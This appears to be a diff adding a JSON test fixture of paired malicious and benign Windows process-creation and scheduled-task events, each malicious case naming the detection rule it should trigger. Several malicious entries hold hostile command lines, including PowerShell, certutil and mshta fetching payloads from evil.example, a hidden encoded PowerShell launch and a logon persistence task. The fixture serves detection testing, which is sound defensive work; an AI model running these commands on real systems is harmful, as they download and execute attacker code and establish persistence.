@@ -1,0 +1,214 @@
+[
+  {
+    "label": "malicious",
+    "case": "encoded PowerShell payload",
+    "expected_rule": "ENCODED_POWERSHELL",
+    "raw": {
+      "EventID": 1, "TimeCreated": "2026-08-20T10:00:00+00:00", "Computer": "TESTHOST",
+      "ProcessGuid": "p1", "ProcessId": 1001,
+      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgA...",
+      "ParentProcessGuid": "pp1", "ParentProcessId": 500,
+      "ParentImage": "C:\\Windows\\explorer.exe", "ParentCommandLine": "explorer.exe",
+      "User": "TESTHOST\\evan"
+    }
+  },
+  {
+    "label": "benign",
+    "case": "normal PowerShell script invocation, no obfuscation flags",
+    "raw": {
+      "EventID": 1, "TimeCreated": "2026-08-20T10:01:00+00:00", "Computer": "TESTHOST",
+      "ProcessGuid": "p2", "ProcessId": 1002,
+      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "CommandLine": "powershell.exe -File C:\\Scripts\\update-inventory.ps1",
+      "ParentProcessGuid": "pp1", "ParentProcessId": 500,
+      "ParentImage": "C:\\Windows\\explorer.exe", "ParentCommandLine": "explorer.exe",
+      "User": "TESTHOST\\evan"
+    }
+  },
+  {
+    "label": "malicious",
+    "case": "Word macro spawning PowerShell",
+    "expected_rule": "OFFICE_SPAWNED_SHELL",
+    "raw": {
+      "EventID": 1, "TimeCreated": "2026-08-20T10:02:00+00:00", "Computer": "TESTHOST",
+      "ProcessGuid": "p3", "ProcessId": 1003,
+      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "CommandLine": "powershell.exe -Command \"Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.example/x.ps1')\"",
+      "ParentProcessGuid": "pp2", "ParentProcessId": 700,
+      "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+      "ParentCommandLine": "\"WINWORD.EXE\" /n \"invoice.docm\"",
+      "User": "TESTHOST\\evan"
+    }
+  },
+  {
+    "label": "benign",
+    "case": "Word spawning the print spooler dialog helper (not a shell)",
+    "raw": {
+      "EventID": 1, "TimeCreated": "2026-08-20T10:03:00+00:00", "Computer": "TESTHOST",
+      "ProcessGuid": "p4", "ProcessId": 1004,
+      "Image": "C:\\Windows\\System32\\splwow64.exe",
+      "CommandLine": "splwow64.exe 12345",
+      "ParentProcessGuid": "pp2", "ParentProcessId": 700,
+      "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+      "ParentCommandLine": "\"WINWORD.EXE\" /n \"report.docx\"",
+      "User": "TESTHOST\\evan"
+    }
+  },
+  {
+    "label": "malicious",
+    "case": "Chrome spawning cmd.exe after a drive-by download",
+    "expected_rule": "BROWSER_SPAWNED_SHELL",
+    "raw": {
+      "EventID": 1, "TimeCreated": "2026-08-20T10:04:00+00:00", "Computer": "TESTHOST",
+      "ProcessGuid": "p5", "ProcessId": 1005,
+      "Image": "C:\\Windows\\System32\\cmd.exe",
+      "CommandLine": "cmd.exe /c C:\\Users\\evan\\Downloads\\invoice.exe",
+      "ParentProcessGuid": "pp3", "ParentProcessId": 800,
+      "ParentImage": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+      "ParentCommandLine": "chrome.exe",
+      "User": "TESTHOST\\evan"
+    }
+  },
+  {
+    "label": "benign",
+    "case": "Chrome spawning its own GPU/renderer helper process",
+    "raw": {
+      "EventID": 1, "TimeCreated": "2026-08-20T10:05:00+00:00", "Computer": "TESTHOST",
+      "ProcessGuid": "p6", "ProcessId": 1006,
+      "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+      "CommandLine": "chrome.exe --type=gpu-process",
+      "ParentProcessGuid": "pp3", "ParentProcessId": 800,
+      "ParentImage": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+      "ParentCommandLine": "chrome.exe",
+      "User": "TESTHOST\\evan"
+    }
+  },
+  {
+    "label": "malicious",
+    "case": "new scheduled task created for persistence",
+    "expected_rule": "SCHEDULED_TASK_CREATED",
+    "raw": {
+      "EventID": 4698, "TimeCreated": "2026-08-20T10:06:00+00:00", "Computer": "TESTHOST",
+      "TaskName": "\\Microsoft\\Windows\\UpdateOrchestrator\\SysUpdateCheck",
+      "SubjectUserName": "evan"
+    }
+  },
+  {
+    "label": "benign",
+    "case": "scheduled task deleted (not created) -- different event action",
+    "raw": {
+      "EventID": 4699, "TimeCreated": "2026-08-20T10:07:00+00:00", "Computer": "TESTHOST",
+      "TaskName": "\\OldBackupJob",
+      "SubjectUserName": "evan"
+    }
+  },
+  {
+    "label": "malicious",
+    "case": "certutil abused to download a payload",
+    "expected_rule": "LOLBIN_DOWNLOAD",
+    "raw": {
+      "EventID": 1, "TimeCreated": "2026-08-20T10:08:00+00:00", "Computer": "TESTHOST",
+      "ProcessGuid": "p7", "ProcessId": 1007,
+      "Image": "C:\\Windows\\System32\\certutil.exe",
+      "CommandLine": "certutil.exe -urlcache -split -f http://evil.example/payload.exe payload.exe",
+      "ParentProcessGuid": "pp4", "ParentProcessId": 900,
+      "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentCommandLine": "cmd.exe",
+      "User": "TESTHOST\\evan"
+    }
+  },
+  {
+    "label": "benign",
+    "case": "certutil used for its normal purpose, verifying a certificate",
+    "raw": {
+      "EventID": 1, "TimeCreated": "2026-08-20T10:09:00+00:00", "Computer": "TESTHOST",
+      "ProcessGuid": "p8", "ProcessId": 1008,
+      "Image": "C:\\Windows\\System32\\certutil.exe",
+      "CommandLine": "certutil.exe -verify C:\\certs\\client.cer",
+      "ParentProcessGuid": "pp4", "ParentProcessId": 900,
+      "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentCommandLine": "cmd.exe",
+      "User": "TESTHOST\\evan"
+    }
+  },
+  {
+    "label": "malicious",
+    "case": "malware dropped and run from Downloads folder",
+    "expected_rule": "EXEC_FROM_TEMP",
+    "raw": {
+      "EventID": 1, "TimeCreated": "2026-08-20T10:10:00+00:00", "Computer": "TESTHOST",
+      "ProcessGuid": "p9", "ProcessId": 1009,
+      "Image": "C:\\Users\\evan\\Downloads\\free_giftcard_generator.exe",
+      "CommandLine": "free_giftcard_generator.exe",
+      "ParentProcessGuid": "pp5", "ParentProcessId": 950,
+      "ParentImage": "C:\\Windows\\explorer.exe", "ParentCommandLine": "explorer.exe",
+      "User": "TESTHOST\\evan"
+    }
+  },
+  {
+    "label": "benign",
+    "case": "legitimate installer run from Downloads folder",
+    "raw": {
+      "EventID": 1, "TimeCreated": "2026-08-20T10:11:00+00:00", "Computer": "TESTHOST",
+      "ProcessGuid": "p10", "ProcessId": 1010,
+      "Image": "C:\\Program Files\\Notepad++\\notepad++.exe",
+      "CommandLine": "notepad++.exe",
+      "ParentProcessGuid": "pp5", "ParentProcessId": 950,
+      "ParentImage": "C:\\Windows\\explorer.exe", "ParentCommandLine": "explorer.exe",
+      "User": "TESTHOST\\evan"
+    }
+  },
+  {
+    "label": "malicious",
+    "case": "mshta running a remote HTA payload",
+    "expected_rule": "LOLBIN_DOWNLOAD",
+    "raw": {
+      "EventID": 1, "TimeCreated": "2026-08-20T10:12:00+00:00", "Computer": "TESTHOST",
+      "ProcessGuid": "p11", "ProcessId": 1011,
+      "Image": "C:\\Windows\\System32\\mshta.exe",
+      "CommandLine": "mshta.exe http://evil.example/payload.hta",
+      "ParentProcessGuid": "pp6", "ParentProcessId": 960,
+      "ParentImage": "C:\\Windows\\explorer.exe", "ParentCommandLine": "explorer.exe",
+      "User": "TESTHOST\\evan"
+    }
+  },
+  {
+    "label": "benign",
+    "case": "mshta running a local, packaged HTA help file",
+    "raw": {
+      "EventID": 1, "TimeCreated": "2026-08-20T10:13:00+00:00", "Computer": "TESTHOST",
+      "ProcessGuid": "p12", "ProcessId": 1012,
+      "Image": "C:\\Windows\\System32\\mshta.exe",
+      "CommandLine": "mshta.exe C:\\Program Files\\VendorApp\\help.hta",
+      "ParentProcessGuid": "pp6", "ParentProcessId": 960,
+      "ParentImage": "C:\\Windows\\explorer.exe", "ParentCommandLine": "explorer.exe",
+      "User": "TESTHOST\\evan"
+    }
+  },
+  {
+    "label": "malicious",
+    "case": "schtasks.exe /create used directly for persistence",
+    "expected_rule": "SCHEDULED_TASK_CREATED",
+    "raw": {
+      "EventID": 1, "TimeCreated": "2026-08-20T10:14:00+00:00", "Computer": "TESTHOST",
+      "ProcessGuid": "p13", "ProcessId": 1013,
+      "Image": "C:\\Windows\\System32\\schtasks.exe",
+      "CommandLine": "schtasks.exe /create /tn Updater /tr C:\\Users\\evan\\AppData\\Local\\Temp\\upd.exe /sc onlogon",
+      "ParentProcessGuid": "pp7", "ParentProcessId": 970,
+      "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentCommandLine": "cmd.exe",
+      "User": "TESTHOST\\evan"
+    }
+  },
+  {
+    "label": "benign",
+    "case": "schtasks.exe queried for existing tasks (no /create)",
+    "raw": {
+      "EventID": 1, "TimeCreated": "2026-08-20T10:15:00+00:00", "Computer": "TESTHOST",
+      "ProcessGuid": "p14", "ProcessId": 1014,
+      "Image": "C:\\Windows\\System32\\schtasks.exe",
+      "CommandLine": "schtasks.exe /query /tn Updater",
+      "ParentProcessGuid": "pp7", "ParentProcessId": 970,
+      "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentCommandLine": "cmd.exe",
+      "User": "TESTHOST\\evan"
+    }
+  }
+]
